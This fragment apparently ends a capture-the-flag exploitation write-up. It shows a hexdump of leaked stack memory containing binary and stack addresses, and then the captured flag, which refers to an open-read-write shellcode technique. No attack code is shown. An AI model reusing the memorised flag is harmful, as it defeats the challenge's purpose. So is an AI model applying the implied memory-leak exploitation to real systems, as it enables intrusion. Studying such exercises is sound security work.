    000000b0  00 00 00 00  00 00 00 00  40 08 81 ed  df 55 00 00  │····│····│@···│·U··│
    000000c0  60 fe 21 0c  fe 7f 00 00  00 00 00 00  00 00 00 00  │`·!·│····│····│····│
    000000d0  00 00 00 00  00 00 00 00  6a 08 81 ed  df 55 00 00  │····│····│j···│·U··│
    000000e0  58 fe 21 0c  fe 7f 00 00  1c 00 00 00  00 00 00 00  │X·!·│····│····│····│
    000000f0  01 00 00 00  00 00 00 00  d8 0f 22 0c  fe 7f 00 00  │····│····│··"·│····│
    00000100
crew{ORW_come_to_the_rescue_st4rn_h3r3!}0
```
